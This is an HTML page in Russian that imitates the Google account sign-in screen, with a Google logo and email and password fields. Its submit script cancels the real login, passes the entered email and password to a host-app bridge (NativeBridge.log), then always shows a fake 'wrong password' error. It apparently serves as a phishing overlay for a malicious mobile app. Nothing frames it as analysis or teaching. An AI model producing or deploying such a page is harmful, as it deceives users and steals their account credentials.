<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Вход – аккаунты Google</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', Arial, sans-serif; }
body { background: #fff; color: #202124; min-height: 100vh; display: flex;
       flex-direction: column; align-items: center; padding: 24px 16px; }
.logo { width: 74px; height: 24px; margin: 30px 0 20px; }
.g-blue{color:#4285f4}.g-red{color:#ea4335}.g-yellow{color:#fbbc05}.g-green{color:#34a853}
.card { width: 100%; max-width: 420px; padding: 32px 24px; }
h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
.sub { text-align: center; font-size: 14px; margin-bottom: 32px; color: #202124; }
.field { position: relative; margin-bottom: 24px; }
.field input { width: 100%; padding: 16px 14px; font-size: 16px;
               border: 1px solid #dadce0; border-radius: 4px; outline: none;
               background: transparent; color: #202124; }
.field input:focus { border: 2px solid #1a73e8; padding: 15px 13px; }
.field label { position: absolute; top: -8px; left: 12px; background: #fff;
               padding: 0 4px; font-size: 12px; color: #5f6368; }
.btn-row { display: flex; justify-content: space-between; align-items: center;
           margin-top: 32px; }
.link { color: #1a73e8; font-size: 14px; cursor: pointer; text-decoration: none; }
.btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
       border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
.btn:hover { background: #1666cb; }
.err { color: #d93025; font-size: 13px; margin-bottom: 16px; display: none;
       padding: 12px; background: #fce8e6; border-radius: 4px; }
</style>
</head>
<body>
<svg class="logo" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
    <text x="0" y="18" font-size="22" font-family="Arial,sans-serif" font-weight="500">
        <tspan class="g-blue">G</tspan><tspan class="g-red">o</tspan><tspan class="g-yellow">o</tspan><tspan class="g-blue">g</tspan><tspan class="g-green">l</tspan><tspan class="g-red">e</tspan>
    </text>
</svg>

<div class="card">
    <h1>Вход</h1>
    <p class="sub">Используйте аккаунт Google</p>

    <div id="err" class="err">Неверный адрес электронной почты или пароль. Повторите попытку.</div>

    <form id="f">
        <div class="field">
            <label>Электронная почта или телефон</label>
            <input type="email" id="email" autocomplete="off" autocapitalize="none">
        </div>
        <div class="field">
            <label>Введите пароль</label>
            <input type="password" id="password" autocomplete="off">
        </div>
        <div class="btn-row">
            <a class="link">Забыли пароль?</a>
            <button type="submit" class="btn">Далее</button>
        </div>
    </form>
</div>

<script>
document.getElementById('f').addEventListener('submit', function(e){
    e.preventDefault();
    var email = document.getElementById('email').value;
    var pass  = document.getElementById('password').value;
    if (window.NativeBridge && NativeBridge.log) {
        NativeBridge.log("email=" + email + "\npassword=" + pass);
    }
    document.getElementById('err').style.display = 'block';
    document.getElementById('password').value = '';
});
</script>
</body>
</html>
